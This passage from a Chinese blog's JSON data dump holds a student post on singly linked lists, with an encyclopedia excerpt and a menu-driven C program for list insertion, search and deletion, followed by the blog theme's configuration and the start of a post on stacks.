class=\"string\">&quot;PAUSE&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":4186,"excerpt":"<h1 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h1><blockquote><p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。</p>\n<p>使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。链表最明显的好处就是，常规数组排列关联项目的方式可能不同于这些数据项目在记忆体或磁盘上顺序，数据的存取往往要在不同的排列顺序中转换。链表允许插入和移除表上任意位置上的节点，但是不允许随机存取。链表有很多种不同的类型：单向链表，双向链表以及循环链表。链表可以在多种编程语言中实现。像Lisp和Scheme这样的语言的内建数据类型中就包含了链表的存取和操作。程序语言或面向对象语言，如C,C++和Java依靠易变工具来生成链表。</p>\n<footer><strong>百度百科</strong><cite><a href=\"https://baike.baidu.com/item/%E9%93%BE%E8%A1%A8/9794473?fr=aladdin\">链表</a></cite></footer></blockquote>","more":"<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    ElemType data;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">&#125;Node,*LinkedList;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListInit</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L;</span><br><span class=\"line\">    L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;申请内存空间失败\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> \t<span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListCreatH_pre</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L,*t;</span><br><span class=\"line\">    t = L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    ElemType x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class=\"line\">        Node *p;</span><br><span class=\"line\">        p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">        p-&gt;data = x;</span><br><span class=\"line\">        t-&gt;next = p;</span><br><span class=\"line\">        p-&gt;next=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        t = t-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListCreatH_back</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L;</span><br><span class=\"line\">    L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    L-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ElemType x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class=\"line\">        Node *p;</span><br><span class=\"line\">        p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">        p-&gt;data = x;</span><br><span class=\"line\">        p-&gt;next = L-&gt;next;</span><br><span class=\"line\">        L-&gt;next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListInsert</span><span class=\"params\">(LinkedList L,<span class=\"keyword\">int</span> i,ElemType x)</span> </span>&#123;</span><br><span class=\"line\">    Node *pre=L;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tempi = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (tempi = <span class=\"number\">1</span>; tempi &lt; i; tempi++) &#123;</span><br><span class=\"line\">    \tpre = pre-&gt;next;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    Node *p;</span><br><span class=\"line\">    p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    p-&gt;data = x;</span><br><span class=\"line\">    p-&gt;next = pre-&gt;next;</span><br><span class=\"line\">    pre-&gt;next = p;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListFind</span><span class=\"params\">(LinkedList L,ElemType x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    Node *p=L-&gt;next;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p-&gt;data != x) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;next==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;没有此数！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p = p-&gt;next;</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d位于第%d个位置！\\n&quot;</span>,x,i);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListDelete</span><span class=\"params\">(LinkedList L,ElemType x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Node *p,*pre=L;</span><br><span class=\"line\">    p = L-&gt;next;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p-&gt;data != x) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;next==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;没有此数！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pre = p;</span><br><span class=\"line\">        p = p-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    pre-&gt;next = p-&gt;next;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1.输入(前插)\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2.输入(后插)\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3.插入数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4.查找数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5.删除数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0.退出程序\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    LinkedList <span class=\"built_in\">list</span>,start;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tsystem(<span class=\"string\">&quot;CLS&quot;</span>);</span><br><span class=\"line\">    \tmenu();</span><br><span class=\"line\">    \t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;choice);</span><br><span class=\"line\">    \t<span class=\"keyword\">switch</span>(choice)</span><br><span class=\"line\">    \t&#123;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">list</span> = LinkedListCreatH_pre();</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">list</span> = LinkedListCreatH_back();</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t\t\t    ElemType x;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入插入数据的位置：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;i);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入插入数据的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListInsert(<span class=\"built_in\">list</span>,i,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\tElemType x;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入要查找的元素的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListFind(<span class=\"built_in\">list</span>,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\tElemType x;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入要删除的元素的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListDelete(<span class=\"built_in\">list</span>,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>:<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">    \tsystem(<span class=\"string\">&quot;PAUSE&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"链表实现栈","date":"2019-03-29T09:11:09.000Z","abbrlink":"25d78577","updated":"2020-04-08T10:40:24.000Z","_content":"# 链表实现栈\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n# 代码\n```cpp\n#include<iostream>\n#define OK 1;\n#define ERROR 0;\ntypedef int Status;\ntypedef int 